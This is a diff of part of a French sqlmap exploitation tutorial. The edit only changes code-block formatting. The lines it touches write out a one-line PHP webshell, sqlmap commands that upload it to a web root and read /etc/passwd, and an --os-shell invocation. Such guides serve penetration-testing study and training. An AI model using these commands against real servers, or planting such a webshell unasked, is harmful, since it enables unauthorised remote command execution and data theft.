@@ -867,12 +867,9 @@ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
   * Privilèges d’écriture dans le répertoire cible.
 *   Commande SQLMap pour écrire un fichier :
 
-    {% code overflow="wrap" %}
-    ```bash
-    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">echo '&#x3C;?php system($_GET["cmd"]); ?>' > shell.php
     sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
-    ```
-    {% endcode %}
+    </code></pre>
 *   Résultat : Le fichier est écrit, et vous pouvez accéder à la webshell :
 
     ```bash
@@ -938,11 +935,8 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
     ```
 2.  Écrire sur le serveur :
 
-    {% code overflow="wrap" %}
-    ```bash
-    sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+    </code></pre>
 3.  Accéder à la webshell :
 
     ```bash
